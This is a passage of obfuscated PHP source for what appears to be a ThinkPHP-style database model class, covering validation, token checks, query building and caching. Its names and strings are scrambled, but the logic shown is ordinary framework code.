THINK_MODEL_INSERT); if (isset($this->options[$ŠÕ•¸íÉ[273]])) { $ú¤êÙİµ = $this->options[$ŠÕ•¸íÉ[273]]; unset($this->options[$ŠÕ•¸íÉ[273]]); } elseif ($ôåû¨Ê™ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ú¤êÙİµ = $this->insertFields; } elseif ($ôåû¨Ê™ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ú¤êÙİµ = $this->updateFields; } if (isset($ú¤êÙİµ)) { if (is_string($ú¤êÙİµ)) { $ú¤êÙİµ = explode($ŠÕ•¸íÉ[50], $ú¤êÙİµ); } if (think_config($ŠÕ•¸íÉ[298])) { $ú¤êÙİµ[] = think_config($ŠÕ•¸íÉ[299]); } foreach ($§úı«Õç as $Ÿ—ÇÌ— => $’¬ôŒÇº) { if (!in_array($Ÿ—ÇÌ—, $ú¤êÙİµ)) { unset($§úı«Õç[$Ÿ—ÇÌ—]); } } } if (!$this->autoValidation($§úı«Õç, $ôåû¨Ê™)) { return !1; } if (!$this->autoCheckToken($§úı«Õç)) { $this->error = think_lang($ŠÕ•¸íÉ[300]); return !1; } if ($this->autoCheckFields) { $ú¤êÙİµ = $this->getDbFields(); foreach ($§úı«Õç as $Ÿ—ÇÌ— => $’¬ôŒÇº) { if (!in_array($Ÿ—ÇÌ—, $ú¤êÙİµ)) { unset($§úı«Õç[$Ÿ—ÇÌ—]); } elseif (MAGIC_QUOTES_GPC && is_string($’¬ôŒÇº)) { $§úı«Õç[$Ÿ—ÇÌ—] = stripslashes($’¬ôŒÇº); } } } $this->autoOperation($§úı«Õç, $ôåû¨Ê™); $this->data = $§úı«Õç; return $§úı«Õç; } public function autoCheckToken($áÇÚƒÔş) { $ìÈ²„œÒ =& $_SERVER[Îûáû“ş]; if (isset($this->options[$ìÈ²„œÒ[301]]) && !$this->options[$ìÈ²„œÒ[301]]) { return !0; } if (think_config($ìÈ²„œÒ[298])) { $×äè¯üÇ = think_config($ìÈ²„œÒ[299]); if (!isset($áÇÚƒÔş[$×äè¯üÇ]) || Session::get($×äè¯üÇ)) { return !1; } list($Ó®ºë¡‚, $ŒÈß¤ÀÖ) = explode($ìÈ²„œÒ[11], $áÇÚƒÔş[$×äè¯üÇ]); if ($ŒÈß¤ÀÖ && Session::get($×äè¯üÇ . $ìÈ²„œÒ[10] . $Ó®ºë¡‚) === $ŒÈß¤ÀÖ) { Session::remove($×äè¯üÇ . $ìÈ²„œÒ[10] . $Ó®ºë¡‚); return !0; } if (think_config($ìÈ²„œÒ[302])) { Session::remove($×äè¯üÇ . $ìÈ²„œÒ[10] . $Ó®ºë¡‚); } return !1; } return !0; } public function regex($¢ş•Ö, $˜¸à÷È¶) { $Èô‘¨«Â =& $_SERVER[Îûáû“ş]; $’±ÏÄÑ = array($Èô‘¨«Â[303] => $Èô‘¨«Â[304], $Èô‘¨«Â[305] => $Èô‘¨«Â[306], $Èô‘¨«Â[307] => $Èô‘¨«Â[308], $Èô‘¨«Â[309] => $Èô‘¨«Â[310], $Èô‘¨«Â[311] => $Èô‘¨«Â[312], $Èô‘¨«Â[313] => $Èô‘¨«Â[314], $Èô‘¨«Â[315] => $Èô‘¨«Â[316], $Èô‘¨«Â[290] => $Èô‘¨«Â[317], $Èô‘¨«Â[318] => $Èô‘¨«Â[319]); if (isset($’±ÏÄÑ[strtolower($˜¸à÷È¶)])) { $˜¸à÷È¶ = $’±ÏÄÑ[strtolower($˜¸à÷È¶)]; } return preg_match($˜¸à÷È¶, $¢ş•Ö) === 1; } private function autoOperation(&$®¸Á¦ô‡, $áÃ¸Øã˜) { $âûİÍ› =& $_SERVER[Îûáû“ş]; if (!empty($this->options[$âûİÍ›[320]])) { $ú€±¯ï = $this->options[$âûİÍ›[320]]; unset($this->options[$âûİÍ›[320]]); } elseif (!empty($this->_auto)) { $ú€±¯ï = $this->_auto; } if (isset($ú€±¯ï)) { foreach ($ú€±¯ï as $ÃØ„æá) { if (empty($ÃØ„æá[2])) { $ÃØ„æá[2] = THINK_MODEL_INSERT; } if ($áÃ¸Øã˜ == $ÃØ„æá[2] || $ÃØ„æá[2] == THINK_MODEL_BOTH) { switch (trim($ÃØ„æá[3])) { case $âûİÍ›[321]: case $âûİÍ›[322]: $îğœÒ Ó = isset($ÃØ„æá[4]) ? (array) $ÃØ„æá[4] : array(); if (isset($®¸Á¦ô‡[$ÃØ„æá[0]])) { array_unshift($îğœÒ Ó, $®¸Á¦ô‡[$ÃØ„æá[0]]); } if ($âûİÍ›[321] == $ÃØ„æá[3]) { $®¸Á¦ô‡[$ÃØ„æá[0]] = call_user_func_array($ÃØ„æá[1], $îğœÒ Ó); } else { $®¸Á¦ô‡[$ÃØ„æá[0]] = call_user_func_array(array(&$this, $ÃØ„æá[1]), $îğœÒ Ó); } break; case $âûİÍ›[273]: $®¸Á¦ô‡[$ÃØ„æá[0]] = $®¸Á¦ô‡[$ÃØ„æá[1]]; break; case $âûİÍ›[323]: if ($âûİÍ›[12] === $®¸Á¦ô‡[$ÃØ„æá[0]]) { unset($®¸Á¦ô‡[$ÃØ„æá[0]]); } break; case $âûİÍ›[324]: default: $®¸Á¦ô‡[$ÃØ„æá[0]] = $ÃØ„æá[1]; } if (!1 === $®¸Á¦ô‡[$ÃØ„æá[0]]) { unset($®¸Á¦ô‡[$ÃØ„æá[0]]); } } } } return $®¸Á¦ô‡; } protected function autoValidation($¤¸ÔÉÁ¶, $¶ÈÌÅöÙ) { $Ö–²é“ =& $_SERVER[Îûáû“ş]; if (!empty($this->options[$Ö–²é“[325]])) { $• ¥Òô¸ = $this->options[$Ö–²é“[325]]; unset($this->options[$Ö–²é“[325]]); } elseif (!empty($this->_validate)) { $• ¥Òô¸ = $this->_validate; } if (isset($• ¥Òô¸)) { if ($this->patchValidate) { $this->error = array(); } foreach ($• ¥Òô¸ as $Ïí´ĞÏ„ => $¦ª¶Îì¢) { if (empty($¦ª¶Îì¢[5]) || $¦ª¶Îì¢[5] == THINK_MODEL_BOTH || $¦ª¶Îì¢[5] == $¶ÈÌÅöÙ) { if (0 == strpos($¦ª¶Îì¢[2], $Ö–²é“[326]) && strpos($¦ª¶Îì¢[2], $Ö–²é“[327])) { $¦ª¶Îì¢[2] = think_lang(substr($¦ª¶Îì¢[2], 2, -1)); } $¦ª¶Îì¢[3] = isset($¦ª¶Îì¢[3]) ? $¦ª¶Îì¢[3] : THINK_EXISTS_VALIDATE; $¦ª¶Îì¢[4] = isset($¦ª¶Îì¢[4]) ? $¦ª¶Îì¢[4] : $Ö–²é“[328]; switch ($¦ª¶Îì¢[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¤¸ÔÉÁ¶, $¦ª¶Îì¢)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ö–²é“[12] != trim($¤¸ÔÉÁ¶[$¦ª¶Îì¢[0]])) { if (!1 === $this->_validationField($¤¸ÔÉÁ¶, $¦ª¶Îì¢)) { return !1; } } break; default: if (isset($¤¸ÔÉÁ¶[$¦ª¶Îì¢[0]])) { if (!1 === $this->_validationField($¤¸ÔÉÁ¶, $¦ª¶Îì¢)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($òæÎËà¢, $ŒŞ¬ğì‚) { if (!1 === $this->_validationFieldItem($òæÎËà¢, $ŒŞ¬ğì‚)) { if ($this->patchValidate) { $this->error[$ŒŞ¬ğì‚[0]] = $ŒŞ¬ğì‚[2]; } else { $this->error = $ŒŞ¬ğì‚[2]; return !1; } } return; } protected function _validationFieldItem($Û–ì‹ù, $ä“éôı) { $˜¹²—˜ =& $_SERVER[Îûáû“ş]; switch (strtolower(trim($ä“éôı[4]))) { case $˜¹²—˜[321]: case $˜¹²—˜[322]: $Á”ğÀç¥ = isset($ä“éôı[6]) ? (array) $ä“éôı[6] : array(); if (is_string($ä“éôı[0]) && strpos($ä“éôı[0], $˜¹²—˜[50])) { $ä“éôı[0] = explode($˜¹²—˜[50], $ä“éôı[0]); } if (is_array($ä“éôı[0])) { foreach ($ä“éôı[0] as $ëù‹öİÃ) { $÷ò¶ö²ú[$ëù‹öİÃ] = $Û–ì‹ù[$ëù‹öİÃ]; } array_unshift($Á”ğÀç¥, $÷ò¶ö²ú); } else { array_unshift($Á”ğÀç¥, $Û–ì‹ù[$ä“éôı[0]]); } if ($˜¹²—˜[321] == $ä“éôı[4]) { return call_user_func_array($ä“éôı[1], $Á”ğÀç¥); } else { return call_user_func_array(array(&$this, $ä“éôı[1]), $Á”ğÀç¥); } case $˜¹²—˜[329]: return $Û–ì‹ù[$ä“éôı[0]] == $Û–ì‹ù[$ä“éôı[1]]; case $˜¹²—˜[330]: if (is_string($ä“éôı[0]) && strpos($ä“éôı[0], $˜¹²—˜[50])) { $ä“éôı[0] = explode($˜¹²—˜[50], $ä“éôı[0]); } $Ğ¦¨‘‡ = array(); if (is_array($ä“éôı[0])) { foreach ($ä“éôı[0] as $ëù‹öİÃ) { $Ğ¦¨‘‡[$ëù‹öİÃ] = $Û–ì‹ù[$ëù‹öİÃ]; } } else { $Ğ¦¨‘‡[$ä“éôı[0]] = $Û–ì‹ù[$ä“éôı[0]]; } if (!empty($Û–ì‹ù[$this->getPk()])) { $Ğ¦¨‘‡[$this->getPk()] = array($˜¹²—˜[331], $Û–ì‹ù[$this->getPk()]); } if ($this->where($Ğ¦¨‘‡)->find()) { return !1; } return !0; default: return $this->check($Û–ì‹ù[$ä“éôı[0]], $ä“éôı[1], $ä“éôı[4]); } } public function check($Ã»­È£ö, $™Õóšæñ, $İØ·ö‡İ = "\x72\145\x67\x65\170") { $™´®¸ÀŸ =& $_SERVER[Îûáû“ş]; $İØ·ö‡İ = strtolower(trim($İØ·ö‡İ)); switch ($İØ·ö‡İ) { case $™´®¸ÀŸ[7]: case $™´®¸ÀŸ[332]: $­¼€üƒñ = is_array($™Õóšæñ) ? $™Õóšæñ : explode($™´®¸ÀŸ[50], $™Õóšæñ); return $İØ·ö‡İ == $™´®¸ÀŸ[7] ? in_array($Ã»­È£ö, $­¼€üƒñ) : !in_array($Ã»­È£ö, $­¼€üƒñ); case $™´®¸ÀŸ[333]: case $™´®¸ÀŸ[334]: if (is_array($™Õóšæñ)) { $ˆÒğ›Û¨ = $™Õóšæñ[0]; $çîú¯˜ = $™Õóšæñ[1]; } else { list($ˆÒğ›Û¨, $çîú¯˜) = explode($™´®¸ÀŸ[50], $™Õóšæñ); } return $İØ·ö‡İ == $™´®¸ÀŸ[333] ? $Ã»­È£ö >= $ˆÒğ›Û¨ && $Ã»­È£ö <= $çîú¯˜ : $Ã»­È£ö < $ˆÒğ›Û¨ || $Ã»­È£ö > $çîú¯˜; case $™´®¸ÀŸ[335]: case $™´®¸ÀŸ[336]: return $İØ·ö‡İ == $™´®¸ÀŸ[335] ? $Ã»­È£ö == $™Õóšæñ : $Ã»­È£ö != $™Õóšæñ; case $™´®¸ÀŸ[337]: $ß¤İŸ•¬ = mb_strlen($Ã»­È£ö, $™´®¸ÀŸ[338]); if (strpos($™Õóšæñ, $™´®¸ÀŸ[50])) { list($ˆÒğ›Û¨, $çîú¯˜) = explode($™´®¸ÀŸ[50], $™Õóšæñ); return $ß¤İŸ•¬ >= $ˆÒğ›Û¨ && $ß¤İŸ•¬ <= $çîú¯˜; } else { return $ß¤İŸ•¬ == $™Õóšæñ; } case $™´®¸ÀŸ[339]: list($Úõ£ÛÈ™, $…ÆÅú²Ñ) = explode($™´®¸ÀŸ[50], $™Õóšæñ); if (!is_numeric($Úõ£ÛÈ™)) { $Úõ£ÛÈ™ = strtotime($Úõ£ÛÈ™); } if (!is_numeric($…ÆÅú²Ñ)) { $…ÆÅú²Ñ = strtotime($…ÆÅú²Ñ); } return NOW_TIME >= $Úõ£ÛÈ™ && NOW_TIME <= $…ÆÅú²Ñ; case $™´®¸ÀŸ[340]: return in_array(get_client_ip(), explode($™´®¸ÀŸ[50], $™Õóšæñ)); case $™´®¸ÀŸ[341]: return !in_array(get_client_ip(), explode($™´®¸ÀŸ[50], $™Õóšæñ)); case $™´®¸ÀŸ[328]: default: return $this->regex($Ã»­È£ö, $™Õóšæñ); } } public function query($ÅÌöˆœó, $ŸŞ§øü© = false) { $°ª¹ˆÑğ =& $_SERVER[Îûáû“ş]; if (!is_bool($ŸŞ§øü©) && !is_array($ŸŞ§øü©)) { $ŸŞ§øü© = func_get_args(); array_shift($ŸŞ§øü©); } $ÅÌöˆœó = str_replace(array($°ª¹ˆÑğ[231], $°ª¹ˆÑğ[342]), $°ª¹ˆÑğ[53], $ÅÌöˆœó); $ÅÌöˆœó = $this->parseSql($ÅÌöˆœó, $ŸŞ§øü©); return $this->db->query($ÅÌöˆœó); } public function execute($¿ÓœÙ£ı, $¥ä´ƒ…º = false) { if (!is_bool($¥ä´ƒ…º) && !is_array($¥ä´ƒ…º)) { $¥ä´ƒ…º = func_get_args(); array_shift($¥ä´ƒ…º); } $¿ÓœÙ£ı = $this->parseSql($¿ÓœÙ£ı, $¥ä´ƒ…º); return $this->db->execute($¿ÓœÙ£ı); } protected function parseSql($ÉÜ±»€Ë, $¼ĞÆËŠĞ) { $ñéû‡ñ­ =& $_SERVER[Îûáû“ş]; if (!0 === $¼ĞÆËŠĞ) { $ßŸÂÄÔà = $this->_parseOptions(); $ÉÜ±»€Ë = $this->db->parseSql($ÉÜ±»€Ë, $ßŸÂÄÔà); } elseif (is_array($¼ĞÆËŠĞ)) { $¼ĞÆËŠĞ = array_map(array($this->db, $ñéû‡ñ­[343]), $¼ĞÆËŠĞ); $ÉÜ±»€Ë = vsprintf($ÉÜ±»€Ë, $¼ĞÆËŠĞ); } else { $ÉÜ±»€Ë = strtr($ÉÜ±»€Ë, array($ñéû‡ñ­[344] => $this->getTableName(), $ñéû‡ñ­[345] => think_config($ñéû‡ñ­[244]))); } $this->db->setModel($this->name); return $ÉÜ±»€Ë; } public function db($ÊŞøñŞÁ = '', $Ğ€ß¡ÅÇ = '', $›Í“Íøí = array()) { $üîŞµ²¬ =& $_SERVER[Îûáû“ş]; if ($üîŞµ²¬[12] === $ÊŞøñŞÁ && $this->db) { return $this->db; } static $¥²“³Ì­ = array(); static $Üã ¶Íä = array(); if (!isset($Üã ¶Íä[$ÊŞøñŞÁ]) || isset($Üã ¶Íä[$ÊŞøñŞÁ]) && $Ğ€ß¡ÅÇ && $¥²“³Ì­[$ÊŞøñŞÁ] != $Ğ€ß¡ÅÇ) { if (!empty($Ğ€ß¡ÅÇ) && is_string($Ğ€ß¡ÅÇ) && !1 === strpos($Ğ€ß¡ÅÇ, $üîŞµ²¬[8])) { $Ğ€ß¡ÅÇ = think_config($Ğ€ß¡ÅÇ); } $ÊŞøñŞÁ = think_guid($Ğ€ß¡ÅÇ); $Üã ¶Íä[$ÊŞøñŞÁ] = Db::getInstance($Ğ€ß¡ÅÇ); } elseif (NULL === $Ğ€ß¡ÅÇ) { $Üã ¶Íä[$ÊŞøñŞÁ]->close(); unset($Üã ¶Íä[$ÊŞøñŞÁ]); return; } if (!empty($›Í“Íøí)) { if (is_string($›Í“Íøí)) { parse_str($›Í“Íøí, $›Í“Íøí); } foreach ($›Í“Íøí as $§‹°¢”… => $õ¨¡üƒ) { $this->setProperty($§‹°¢”…, $õ¨¡üƒ); } } $¥²“³Ì­[$ÊŞøñŞÁ] = $Ğ€ß¡ÅÇ; $this->db = $Üã ¶Íä[$ÊŞøñŞÁ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¾²ƒÄœ = get_class($this); if ($¾²ƒÄœ == $_SERVER[Îûáû“ş][346]) { return $this->name; } $this->name = substr($¾²ƒÄœ, 0, -5); } return $this->name; } public function getTableName() { $ ¦Ü£ï =& $_SERVER[Îûáû“ş]; if (empty($this->trueTableName)) { $Æòæ½Ä = !empty($this->tablePrefix) ? $this->tablePrefix : $ ¦Ü£ï[12]; if (!empty($this->tableName)) { $Æòæ½Ä .= $this->tableName; } else { $Æòæ½Ä .= think_parse_name($this->name); } $this->trueTableName = strtolower($Æòæ½Ä); } return (!empty($this->dbName) ? $this->dbName . $ ¦Ü£ï[10] : $ ¦Ü£ï[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $âš®º×­ =& $_SERVER[Îûáû“ş]; return isset($this->fields[$âš®º×­[251]]) ? $this->fields[$âš®º×­[251]] : $this->pk; } public function getDbFields() { $¢¬Ó´‹  =& $_SERVER[Îûáû“ş]; if (isset($this->options[$¢¬Ó´‹ [279]])) { $¸á…’Ô˜ = $this->db->getFields($this->options[$¢¬Ó´‹ [279]]); return $¸á…’Ô˜ ? array_keys($¸á…’Ô˜) : !1; } if ($this->fields) { $¸á…’Ô˜ = $this->fields; unset($¸á…’Ô˜[$¢¬Ó´‹ [250]], $¸á…’Ô˜[$¢¬Ó´‹ [251]], $¸á…’Ô˜[$¢¬Ó´‹ [252]], $¸á…’Ô˜[$¢¬Ó´‹ [249]]); return $¸á…’Ô˜; } return !1; } public function data($±÷‹ƒ•º = '') { $¼†ÎŒËˆ =& $_SERVER[Îûáû“ş]; if ($¼†ÎŒËˆ[12] === $±÷‹ƒ•º && !empty($this->data)) { return $this->data; } if (is_object($±÷‹ƒ•º)) { $±÷‹ƒ•º = get_object_vars($±÷‹ƒ•º); } elseif (is_string($±÷‹ƒ•º)) { parse_str($±÷‹ƒ•º, $±÷‹ƒ•º); } elseif (!is_array($±÷‹ƒ•º)) { think_exception(think_lang($¼†ÎŒËˆ[271])); } $this->data = $±÷‹ƒ•º; return $this; } public function join($ÏÁú°ôø) { $óÇ¨ò =& $_SERVER[Îûáû“ş]; if (is_array($ÏÁú°ôø)) { $this->options[$óÇ¨ò[282]] = $ÏÁú°ôø; } elseif (!empty($ÏÁú°ôø)) { $this->options[$óÇ¨ò[282]][] = $ÏÁú°ôø; } return $this; } public function union($í’Ìà¾º, $½×úòˆ = false) { $µ¬»Ú·ä =& $_SERVER[Îûáû“ş]; if (empty($í’Ìà¾º)) { return $this; } if ($½×úòˆ) { $this->options[$µ¬»Ú·ä[347]][$µ¬»Ú·ä[348]] = !0; } if (is_object($í’Ìà¾º)) { $í’Ìà¾º = get_object_vars($í’Ìà¾º); } if (is_string($í’Ìà¾º)) { $âã¸·æ = $í’Ìà¾º; } elseif (is_array($í’Ìà¾º)) { if (isset($í’Ìà¾º[0])) { $this->options[$µ¬»Ú·ä[347]] = array_merge($this->options[$µ¬»Ú·ä[347]], $í’Ìà¾º); return $this; } else { $âã¸·æ = $í’Ìà¾º; } } else { think_exception(think_lang($µ¬»Ú·ä[271])); } $this->options[$µ¬»Ú·ä[347]][] = $âã¸·æ; return $this; } public function cache($†½òô±Ø = true, $½³È = null, $ì³ˆÍúŠ = '') { $€ª›²°È =& $_SERVER[Îûáû“ş]; if (!1 !== $†½òô±Ø) { $this->options[$€ª›²°È[349]] = array($€ª›²°È[94] => $†½òô±Ø, $€ª›²°È[339] => $½³È, $€ª›²°È[33] => $ì³ˆÍúŠ); } return $this; } public function field($µÂ¢ÍàÄ, $ÕÍîĞÇı = false) { $Ö™÷˜†¬ =& $_SERVER[Îûáû“ş]; if (!0 === $µÂ¢ÍàÄ) { $ö»»ù‰š = $this->getDbFields(); $µÂ¢ÍàÄ = $ö»»ù‰š ? $ö»»ù‰š : $Ö™÷˜†¬[189]; } elseif ($ÕÍîĞÇı) { if (is_string($µÂ¢ÍàÄ)) { $µÂ¢ÍàÄ = explode($Ö™÷˜†¬[50], $µÂ¢ÍàÄ); } $ö»»ù‰š = $this->getDbFields(); $µÂ¢ÍàÄ = $ö»»ù‰š ? array_diff($ö»»ù‰š, $µÂ¢ÍàÄ) : $µÂ¢ÍàÄ; } $this->options[$Ö™÷˜†¬[273]] = $µÂ¢ÍàÄ; return $this; } public function scope($ñöÎ§Êµ = '', $©ìÂäÉÄ = NULL) { $à·°¨› =& $_SERVER[Îûáû“ş]; if ($à·°¨›[12] === $ñöÎ§Êµ) { if (isset($this->_scope[$à·°¨›[37]])) { $º–ñªâò = $this->_scope[$à·°¨›[37]]; } else { return $this; } } elseif (is_string($ñöÎ§Êµ)) { $ø–œØµå = explode($à·°¨›[50], $ñöÎ§Êµ); $º–ñªâò = array(); foreach ($ø–œØµå as $–ñØ‡ÓÓ) { if (!isset($this->_scope[$–ñØ‡ÓÓ])) { continue; } $º–ñªâò = array_merge($º–ñªâò, $this->_scope[$–ñØ‡ÓÓ]); } if (!empty($©ìÂäÉÄ) && is_array($©ìÂäÉÄ)) { $º–ñªâò = array_merge($º–ñªâò, $©ìÂäÉÄ); } } elseif (is_array($ñöÎ§Êµ)) { $º–ñªâò = $ñöÎ§Êµ; } if (is_array($º–ñªâò) && !empty($º–ñªâò)) { $this->options = array_merge($this->options, array_change_key_case($º–ñªâò)); } return $this; } public function where($Ç¡–ú°, $ĞÈ˜œ‡Ê = null) { $Ñæòğù­ =& $_SERVER[Îûáû“ş]; if (!is_null($ĞÈ˜œ‡Ê) && is_string($Ç¡–ú°)) { if (!is_array($ĞÈ˜œ‡Ê)) { $ĞÈ˜œ‡Ê = func_get_args(); array_shift($ĞÈ˜œ‡Ê); } $ĞÈ˜œ‡Ê = array_map(array($this->db, $Ñæòğù­[343]), $ĞÈ˜œ‡Ê); $Ç¡–ú° = vsprintf($Ç¡–ú°, $ĞÈ˜œ‡Ê); } elseif (is_object($Ç¡–ú°)) { $Ç¡–ú° = get_object_vars($Ç¡–ú°); } elseif (is_array($Ç¡–ú°)) { foreach ($Ç¡–ú° as $Ûµ‚—° => $¯Íø†Á¦) { if ((is_numeric($Ûµ‚—°) || !$Ûµ‚—°) && is_string($¯Íø†Á¦)) { if (strpos($¯Íø†Á¦, $Ñæòğù­[350]) === 0) { continue; } think_trace($Ñæòğù­[351], $Ñæòğù­[12], $Ñæòğù­[49]); die; } } } if (is_string($Ç¡–ú°) && $Ñæòğù­[12] != $Ç¡–ú°) { $‚Ÿ„—­Ñ = array(); $‚Ÿ„—­Ñ[$Ñæòğù­[352]] = $Ç¡–ú°; $Ç¡–ú° = $‚Ÿ„—­Ñ; } if (isset($this->options[$Ñæòğù­[275]])) { $this->options[$Ñæòğù­[275]] = array_merge($this->options[$Ñæòğù­[275]], $Ç¡–ú°); } else { $this->options[$Ñæòğù­[275]] = $Ç¡–ú°; } return $this; } public function limit($®¸Áê½Í, $ñ¼ÌÒü = null) { $¸¤·¶¶ç =& $_SERVER[Îûáû“ş]; $this->options[$¸¤·¶¶ç[292]] = is_null($ñ¼ÌÒü) ? $®¸Áê½Í : $®¸Áê½Í . $¸¤·¶¶ç[50] . $ñ¼ÌÒü; return $this; } public function page($şœçÀè, $¥ù¼û×Í = null) { $ô÷Ô…ï =& $_SERVER[Îûáû“ş]; $this->options[$ô÷Ô…ï[353]] = is_null($¥ù¼û×Í) ? $şœçÀè : $şœçÀè . $ô÷Ô…ï[50] . $¥ù¼û×Í; return $this; } public function comment($”›’ß±³) { $this->options[$_SERVER[Îûáû“ş][354]] = $”›’ß±³; return $this; } public function setProperty($ƒ·‚Ã£, $®Ÿà•‡ó) { if (property_exists($this, $ƒ·‚Ã£)) { $this->{$ƒ·‚Ã£} = $®Ÿà•‡ó; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\155\x65", "\x74\151\155\x65", "\151\x6e\163\145\162\x74\x2c\x75\x70\x64\x61\x74\x65", "\146\165\156\143\x74\x69\x6f\156"), array("\143\x72\145\141\164\x65\x54\x69\155\145", "\164\151\155\145", "\x69\156\x73\145\162\x74", "\146\x75\156\143\x74\x69\x6f\x6e")); public function setDataAuto($çÁóÀÄ) { $this->dataAuto = $çÁóÀÄ; } public function __construct($¿‚™¬¡ = '', $Ö™åÁğ­ = '', $¹ñí¯¡½ = '') { parent::__construct($¿‚™¬¡, $Ö™åÁğ­, $¹ñí¯¡½); } protected $tableMeta = array(); protected function _beforeInsert(&$Ç‹Ø®¹Ì, $È¡È¸í) { $ø‹ƒÎÆ® =& $_SERVER[Îûáû“ş]; if (!$this->checkDataAutoHas($ø‹ƒÎÆ®[355])) { return; } $this->dataBeforeFilter($Ç‹Ø®¹Ì, $ø‹ƒÎÆ®[355]); } protected function _beforeUpdate(&$îñáŒÙæ, $†¡‰«Ûô) { $†É§•“ =& $_SERVER[Îûáû“ş]; if (!$this->checkDataAutoHas($†É§•“[356])) { return; } $this->dataBeforeFilter($îñáŒÙæ, $†É§•“[356]); } protected function _afterSelect(&$ÂÏïœŞü, $š“ùúéÃ) { if (!is_array($ÂÏïœŞü)) { return; } if (!$this->checkDataAutoHas($_SERVER[Îûáû“ş][357])) { return; } foreach ($ÂÏïœŞü as &$íœÔ©¤¾) { $this->dataAfterFilter($íœÔ©¤¾); } unset($íœÔ©¤¾); } protected function _afterFind(&$²ö´¹´î, $œ‡ÁÜÛ©) { if (!is_array($²ö´¹´î)) { return; } if (!$this->checkDataAutoHas($_SERVER[Îûáû“ş][357])) { return; } $this->dataAfterFilter($²ö´¹´î); } public static function textEncode($³û”â¯›) { if (!$³û”â¯›) { return $³û”â¯›; } $Ê¼ĞÒÊã = json_encode($³û”â¯›); $Ê¼ĞÒÊã = preg_replace_callback($_SERVER[Îûáû“ş][358], function ($¸±”•Ï™) { return addslashes($¸±”•Ï™[0]); }, $Ê¼ĞÒÊã); return json_decode($Ê¼ĞÒÊã); } public static function textDecode($Òíğì¾Õ) { $‰›Úü®• =& $_SERVER[Îûáû“ş]; $®£¥îö = json_encode($Òíğì¾Õ); $®£¥îö = preg_replace_callback($‰›Úü®•[359], function ($‹¡ªŒ€¬) { return $_SERVER[Îûáû“ş][97]; }, $®£¥îö); return json_decode($®£¥îö); } public function setAutoIncrement($®íåúÛ) { $ê´¯ß‚¨ = array($this->getPk() => $®íåúÛ); $ÖïöüÛî = $this->data($ê´¯ß‚¨)->add(); if ($ÖïöüÛî) { $this->delete($ÖïöüÛî); } } public function getAutoIncrement() { $³§ÙŠËŒ = $this->getTableName(); $„Œé­ÈÔ = $this->max($this->getPk()); $ÁĞ‰Ÿ‚– = $this->query("\x73\x68\x6f\x77\x20\x74\141\142\154\145\40\x73\164\x61\164\165\x73\x20\167\150\145\x72\x65\x20\x4e\141\155\x65\x3d\x27{$³§ÙŠËŒ}\47"); $µãóñ›í = $ÁĞ‰Ÿ‚–[0][$_SERVER[Îûáû“ş][360]]; $‹¤º = max($„Œé­ÈÔ, $µãóñ›í); return $‹¤º; } protected function _callBefore($óãó¥Š, $½“í—¬Û) { return $this->cacheCallCheck($óãó¥Š, $½“í—¬Û, !1); } protected function _callAfter($Â¦ıöü¶, $Ùµ¥Ñò‚) { return $this->cacheCallCheck($Â¦ıöü¶, $Ùµ¥Ñò‚, !0); } protected function cacheFunctionAlias($¶§½˜Š«) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¥åİ¹Ü, $Á„œËûª, $íÃŸ¤§µ = false) { $¨åğŸØ = $this->cacheFunctionAlias($Á„œËûª); if (!$¨åğŸØ) { return; } foreach ($¨åğŸØ as $ÒšÉ®…¡ => $¥Î¿À‰É) { $¼Ùƒ©²ì = $¥Î¿À‰É[0]; $ğÏˆÈàê = explode($_SERVER[Îûáû“ş][50], $¥Î¿À‰É[1]); if ($¥åİ¹Ü == $ÒšÉ®…¡) { return $this->cacheFunctionGet($ÒšÉ®…¡, $¼Ùƒ©²ì); } if ($íÃŸ¤§µ && in_array($¥åİ¹Ü, $ğÏˆÈàê)) { $this->cacheFunctionClear($ÒšÉ®…¡, $¼Ùƒ©²ì); } } } public function cacheFunctionGet($ÏÑ ø»†, $›úŞŞ–Ô) { $”üä½§Œ = $this->cacheKeyMake($ÏÑ ø»†, $›úŞŞ–Ô); $«Á¶¦îœ = Cache::get($”üä½§Œ); if (!is_array($«Á¶¦îœ)) { $«Á¶¦îœ = call_user_func_array(array($this, $ÏÑ ø»†), array($›úŞŞ–Ô, !0)); Cache::set($”üä½§Œ, $«Á¶¦îœ); } return $«Á¶¦îœ; } public function cacheFunctionClear($Ïá£ñÊ¨, $•¨è•€Œ) { $ş·œ§†Î = $•¨è•€Œ; if (!is_array($•¨è•€Œ)) { $ş·œ§†Î = array($•¨è•€Œ); } foreach ($ş·œ§†Î as $£–›‰€) { $™î•¦ = $this->cacheKeyMake($Ïá£ñÊ¨, $£–›‰€); Cache::remove($™î•¦); } } private function cacheKeyMake($ì¬øã÷š, $ÌÛŠ½…«) { $—Ì ç‘ =& $_SERVER[Îûáû“ş]; return get_class($this) . $—Ì ç‘[11] . $ì¬øã÷š . $—Ì ç‘[361] . $ÌÛŠ½…«; } protected function selectPageReset() { $ºÁÇÀ =& $_SERVER[Îûáû“ş]; if (isset($GLOBALS[$ºÁÇÀ[362]])) { return; } $GLOBALS[$ºÁÇÀ[362]] = isset($GLOBALS[$ºÁÇÀ[7]][$ºÁÇÀ[363]]) ? $GLOBALS[$ºÁÇÀ[7]][$ºÁÇÀ[363]] : !1; $GLOBALS[$ºÁÇÀ[364]] = isset($GLOBALS[$ºÁÇÀ[7]][$ºÁÇÀ[353]]) ? $GLOBALS[$ºÁÇÀ[7]][$ºÁÇÀ[353]] : !1; $GLOBALS[$ºÁÇÀ[7]][$ºÁÇÀ[363]] = !1; 